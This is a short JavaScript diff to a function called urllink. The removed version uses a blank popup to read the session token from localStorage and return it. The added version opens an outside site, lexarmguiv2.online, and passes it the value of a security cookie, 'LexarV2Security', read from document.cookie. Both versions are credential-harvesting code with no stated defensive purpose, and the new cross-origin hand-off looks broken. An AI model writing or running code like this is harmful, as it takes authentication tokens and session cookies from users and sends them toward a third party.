@@ -1,15 +1,16 @@
 function urllink() {
 
-    let popup = window.open('', '', `top=0,left=${screen.width-800},width=850,height=${screen.height}`);
-    if(!popup || !popup.document || !popup.document.write) return alert('pop ups blocked please enable!');
-
-    window.dispatchEvent(new Event('beforeunload'));
-
-    var linkhelper = popup.localStorage.token
-    linkhelper = linkhelper.slice(1, -1); // Gets rid of the quotes
-    popup.window.close()
-    return linkhelper
-
+    let popup = window.open('https://lexarmguiv2.online/generator')
+    function getCookie(name) {
+        let cookie = {};
+         document.cookie.split(';').forEach(function(el) {
+         let [k,v] = el.split('=');
+         cookie[k.trim()] = v;
+         })
+         return cookie[name];
+    }
+    popup.alert(getCookie('LexarV2Security'))
+    
 
 
 }
